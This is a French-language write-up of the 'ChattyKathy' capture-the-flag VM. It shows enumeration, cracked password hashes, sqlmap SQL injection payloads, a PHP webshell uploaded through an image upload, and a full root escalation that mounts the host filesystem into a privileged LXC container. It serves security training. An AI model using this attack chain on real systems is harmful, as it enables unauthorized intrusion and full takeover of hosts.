# Solution du CTF ChattyKathy de iamv1nc3nt

Last one standing
-----------------

Je termine cette série de CTF de [iamv1nc3nt](https://iamv1nc3nt.com/) avec ce boot2root baptisé *ChattyKathy*.  

```plain
$ sudo nmap -sCV -p- -T5 192.168.56.28 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:39 CET 
Nmap scan report for 192.168.56.28 
Host is up (0.00053s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 57:75:67:f1:36:92:f6:26:ad:cf:57:10:0c:d9:20:f0 (RSA) 
|   256 dc:d6:9d:e2:d1:f5:42:81:ed:ef:78:28:b1:98:e3:26 (ECDSA) 
|_  256 ef:9f:62:aa:90:b1:3b:d7:aa:ca:db:d0:7d:7e:17:04 (ED25519) 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-title: Apache2 Ubuntu Default Page: It works 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
MAC Address: 08:00:27:F4:AA:5A (Oracle VirtualBox virtual NIC) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On a droit à la page par défaut d'Ubuntu, fouillons un peu avec *Feroxbuster* :  

```plain
$ feroxbuster -u http://192.168.56.28/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.28/
 🚀  Threads               │ 50
 📖  Wordlist              │ /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      375l      964w    10918c http://192.168.56.28/index.html
200        8l       23w      198c http://192.168.56.28/404.html
403        9l       28w      278c http://192.168.56.28/.htaccess
200        0l        0w        0c http://192.168.56.28/config.php
200      433l     1115w        0c http://192.168.56.28/index.php
200      375l      964w    10918c http://192.168.56.28/
403        9l       28w      278c http://192.168.56.28/.html
500       15l       25w      266c http://192.168.56.28/portal.php
403        9l       28w      278c http://192.168.56.28/.php
403        9l       28w      278c http://192.168.56.28/.htm
403        9l       28w      278c http://192.168.56.28/.htpasswds
403        9l       28w      278c http://192.168.56.28/.htgroup
403        9l       28w      278c http://192.168.56.28/wp-forum.phps
403        9l       28w      278c http://192.168.56.28/.htpasswd
403        9l       28w      278c http://192.168.56.28/.htaccess.bak
403        9l       28w      278c http://192.168.56.28/.htuser
403        9l       28w      278c http://192.168.56.28/.ht
403        9l       28w      278c http://192.168.56.28/.htc
403        9l       28w      278c http://192.168.56.28/.htaccess.old
403        9l       28w      278c http://192.168.56.28/.htacess
[####################] - 11s    37034/37034   0s      found:20      errors:0      
[####################] - 11s    37034/37034   3334/s  http://192.168.56.28/
```

La page qui retourne une erreur 500 retourne aussi du contenu mais rien d'intéressant. Le script doit être inclus depuis un autre fichier et utiliser des variables non définies d'où ce code d'erreur :  

```html
$ curl -D- http://192.168.56.28/portal.php
HTTP/1.0 500 Internal Server Error
Date: Fri, 11 Feb 2022 08:42:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 266
Connection: close
Content-Type: text/html; charset=UTF-8

<style>
        #chat_convo{
                max-height: 65vh;
        }
        #chat_convo .direct-chat-messages{
                min-height: 250px;
                height: inherit;
        }
        #chat_convo .card-body {
                overflow: auto;
        }
</style>
<div class="container-fluid">
        <div class="row">
                <div class="col-lg-8 
```

En énumérant les dossiers je trouve quelques pistes :  

```plain
301        9l       28w      316c http://192.168.56.28/plugins 
301        9l       28w      317c http://192.168.56.28/database 
301        9l       28w      316c http://192.168.56.28/uploads 
301        9l       28w      312c http://192.168.56.28/inc 
301        9l       28w      316c http://192.168.56.28/classes 
301        9l       28w      313c http://192.168.56.28/libs 
301        9l       28w      314c http://192.168.56.28/admin 
301        9l       28w      314c http://192.168.56.28/build 
301        9l       28w      313c http://192.168.56.28/dist 
403        9l       28w      278c http://192.168.56.28/server-status
```

Par exemple le dossier *database* contient deux fichiers SQL qui s'avèrent être identiques. On y trouve une instruction *INSERT* contenant un hash pour l'utilisateur *admin*.  

Comme il s'agit d'un hash sans salt (type MD5 ou SHA), je profite de [CrackStation](https://crackstation.net/) pour obtenir immédiatement le mot de passe en clair : *admin123*.  

En continuant mon exploration des dossiers je croise des références au nom d'hôte *chattykathy* comme */admin* qui effectue une redirection par tag HTML meta vers *http://chattykathy/admin/login.php* ou encore le script */classes/Login.php* qui contient le code suivant :  

```html
<h1>Access Denied</h1> <a href='http://chattykathy/'>Go Back.</a>
```

Je remarque aussi une référence à [AdminLTE](https://adminlte.io/) mais cette appli semble uniquement être composée de HTML et Javascript, ce qui laisse supposer que la partie PHP est à la charge de l'utilisateur (?) Dans tous les cas aucun exploit ne semble lié à cette application.  

J'ajoute une entrée dans mon fichier */etc/hosts* et je parviens à me connecter avec le compte *admin* et le mot de passe précédemment cassé.  

L'appli web a des URLs de ce type :  

```plain
http://chattykathy/admin/?page=responses/manage&id=12
```

Le paramètre *page* semble un bon candidat à une faille d'inclusion. C'est en partie vrai car si on préfixe la valeur par un *./* alors on obtient la même page. Toutefois le script semble ajouter à la fois préfixe et suffixe en *.php* ce qui fait que l'exploitation est plus que compliquée.  

Il s'agit bien d'une inclusion et non d'un *readfile()* car si on passe par exemple *../classes/DBConnection* (vu lors de l'exploration) on n'obtient aucun code PHP, tout semble interprété.  

Maintenant il y a le paramètre *id* et lui semble vulnérable à une faille d'injection SQL. On s'en rend compte par exemple en lui passant la valeur *13-1* qui donne le même résultat que pour la valeur *12*.  

*SQLmap* valide cette découverte. Il faut lui donner le cookie pour qu'il passe l'authentification :  

```plain
$ python sqlmap.py --cookie="PHPSESSID=h46pcdnluucg56usr2jj5fgj4v" \
  -u "http://chattykathy/admin/?page=responses/manage&id=15" -p id --dbms mysql --risk 3 --level 5
--- snip ---

sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests: 
--- 
Parameter: id (GET) 
    Type: boolean-based blind 
    Title: AND boolean-based blind - WHERE or HAVING clause 
    Payload: page=responses/manage&id=15 AND 5115=5115 

    Type: time-based blind 
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) 
    Payload: page=responses/manage&id=15 AND (SELECT 1783 FROM (SELECT(SLEEP(5)))LKEm) 

    Type: UNION query 
    Title: Generic UNION query (NULL) - 3 columns 
    Payload: page=responses/manage&id=-3103 UNION ALL SELECT NULL,CONCAT(0x71627a7171,0x6b627a614357726e4a737a706a76424855557a634954654e5a4d57456f7163544f4d7a417571746a,0x717a7a7071),NULL-- - 
---
--- snip ---
```

En jouant avec les différentes options de SQLmap j'ai extrait les infos suivantes :  

```plain
current user: 'webuser@localhost'

available databases [5]: 
[*] chatbot_db 
[*] information_schema 
[*] mysql 
[*] performance_schema 
[*] sys

Database: chatbot_db 
[6 tables] 
+---------------+ 
| frequent_asks | 
| questions     | 
| responses     | 
| system_info   | 
| unanswered    | 
| users         | 
+---------------+

Database: chatbot_db 
Table: users 
[2 entries] 
+----+-------------------------------+----------+----------------------------------+----------------------------------+--------------+---------------------+---------------------+---------------------+ 
| id | avatar                        | username | lastname                         | password                         | firstname    | last_login          | date_added          | date_updated        | 
+----+-------------------------------+----------+----------------------------------+----------------------------------+--------------+---------------------+---------------------+---------------------+ 
| 1  | uploads/1620201300_avatar.png | <blank>  | 0192023a7bbd73250516f069df18b500 | admin                            | Adminstrator | Admin               | 2021-01-20 14:02:37 | 2021-05-05 15:55:28 | 
| 2  | <blank>                       | tommy    | <blank>                          | e532ae6f28f4c2be70b500d3d34724eb | tommy        | 2021-01-20 14:02:37 | 2021-01-20 14:02:37 | 2021-01-20 14:02:37 | 
+----+-------------------------------+----------+----------------------------------+----------------------------------+--------------+---------------------+---------------------+---------------------+
```

Le mot de passe de *tommy* se casse lui aussi sur CrackStation en *password19*. Ces identifiants ne permettent toutefois pas un accès SSH.  

L'option *--privileges* de SQLmap indique que l'utilisateur courant dispose de permissions similaires à l'utilisateur *root* de MySQL avec par exemple la permission *FILE*. J'ai tenté d'exfiltrer des fichiers et de déposer une backdoor sur la VM mais rien n'a fonctionné.  

Up!
---

La page */admin/?page=system\_info* permet l'upload de différentes images comme celle d'un logo ou des avatars pour un bot ou l'utilisateur courant. Je n'ai pas immédiatement réalisé que c'était faillible car le script semble fonctionner en deux étapes:  

* Lors de la sélection du fichier à uploader l'image apparaît bien dans la page mais l'affichage de son adresse donne une URL en *data://* laissant supposer que le contenu est conservé directement en base
* Si on valide le formulaire en base de page alors l'URL de l'image devient une URL classique avec un path dans */uploads*

Tout ça c'est la *magie noire* de Javascript :p Il ne faut pas se laisser berner.  

Quoiqu'il en soit j'obtiens mon webshell à l'adresse */uploads/1644576420\_shell.php?cmd=id* que j'upgrade via ReverseSSH en un beau terminal digne de ce nom.  

J'en profite pour accéder aux identifiants dans */var/www/html/classes/DBConnection.php* :  

```php
class DBConnection{ 

    private $host = '127.0.0.1'; 
    private $username = 'webuser'; 
    private $password = 'VJk2324GG'; 
    private $database = 'chatbot_db';
```

Mais ceux-ci ne m'apporteront aucun bénéfice car il y a bien un utilisateur *tommy* en local et je peux m'y connecter via *su* avec le mot de passe *password19*.  

Cet utilisateur peut appeler *lxc* avec les privilèges de root :  

```plain
tommy@chattykathy:/var/www/html$ sudo -l 
[sudo] password for tommy:  
Matching Defaults entries for tommy on chattykathy: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User tommy may run the following commands on chattykathy: 
    (ALL) /snap/bin/lxc 
tommy@chattykathy:/var/www/html$ cd 
tommy@chattykathy:~$ ls -al 
total 28 
drwx------ 4 tommy tommy 4096 Jan 25 15:33 . 
drwxr-xr-x 5 root  root  4096 Jan 25 17:38 .. 
drwxrwxr-x 3 tommy tommy 4096 Jan 25 15:33 .alpine 
lrwxrwxrwx 1 tommy tommy    9 Jan 25 15:28 .bash_history -> /dev/null 
-rw-r--r-- 1 tommy tommy  220 Jan 25 15:26 .bash_logout 
-rw-r--r-- 1 tommy tommy 3771 Jan 25 15:26 .bashrc 
-rw-r--r-- 1 tommy tommy  807 Jan 25 15:26 .profile 
drwx------ 3 tommy tommy 4096 Jan 25 15:33 snap
```

Je ne connais pas bien LXC mais c'est comme du Docker mis à part que certains éléments de langage changent :  

```plain
tommy@chattykathy:~$ sudo /snap/bin/lxc image list 
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ 
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          | 
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ 
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | Jan 25, 2022 at 3:35pm (UTC) | 
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+

tommy@chattykathy:~$ sudo /snap/bin/lxc list 
+-------------+---------+----------------------+-----------------------------------------------+-----------+-----------+ 
|    NAME     |  STATE  |         IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS | 
+-------------+---------+----------------------+-----------------------------------------------+-----------+-----------+ 
| mycontainer | RUNNING | 10.23.181.147 (eth0) | fd42:3118:9576:fa6d:216:3eff:fe96:fade (eth0) | CONTAINER | 0         | 
+-------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
```

Je suppose que l'exploitation est du même type à savoir monter la racine de l'hôte comme volume dans le container. En fouillant sur mon site je redécouvre que j'avais déjà exploité ça sur [le CTF Aloha de Wizard Labs](http://devloop.users.sourceforge.net/index.php?article212/solution-du-ctf-aloha-de-wizard-labs).  

Il aura fallut seulement quelques essais pour trouver le bon shell à demander à l'image Alpine :  

```plain
tommy@chattykathy:~$ sudo /snap/bin/lxc init myimage devloop -c security.privileged=true 
Creating devloop 
tommy@chattykathy:~$ sudo /snap/bin/lxc config device add devloop mydevice disk source=/ path=/hostfs recursive=true             
Device mydevice added to devloop 
tommy@chattykathy:~$ sudo /snap/bin/lxc start devloop 
tommy@chattykathy:~$ sudo /snap/bin/lxc exec devloop bash 
tommy@chattykathy:~$ sudo /snap/bin/lxc exec devloop /bin/bash 
tommy@chattykathy:~$ sudo /snap/bin/lxc exec devloop sh 
~ # id 
uid=0(root) gid=0(root) 
~ # cd /hostfs 
/hostfs # ls 
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var 
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr 
/hostfs # cd root 
/hostfs/root # ls 
root.txt  snap 
/hostfs/root # cat root.txt 

  ______ _                            _    _           _            
 / _____) |          _   _           | |  / )     _   | |           
| /     | | _   ____| |_| |_ _   _   | | / / ____| |_ | | _  _   _  
| |     | || \ / _  |  _)  _) | | |  | |< < / _  |  _)| || \| | | | 
| \_____| | | ( ( | | |_| |_| |_| |  | | \ ( ( | | |__| | | | |_| | 
 \______)_| |_|\_||_|\___)___)__  |  |_|  \_)_||_|\___)_| |_|\__  | 
                            (____/                          (____/  
                                          _                         
 ___ ___                     _           | |   ___ ___              
(___|___)    ____ ___   ___ | |_  ____ _ | |  (___|___)             
 ___ ___    / ___) _ \ / _ \|  _)/ _  ) || |   ___ ___              
(___|___)  | |  | |_| | |_| | |_( (/ ( (_| |  (___|___)             
           |_|   \___/ \___/ \___)____)____|                        

3d0c316df8b1b3562b01f83154da9744
```



*Published February 11 2022 at 13:32*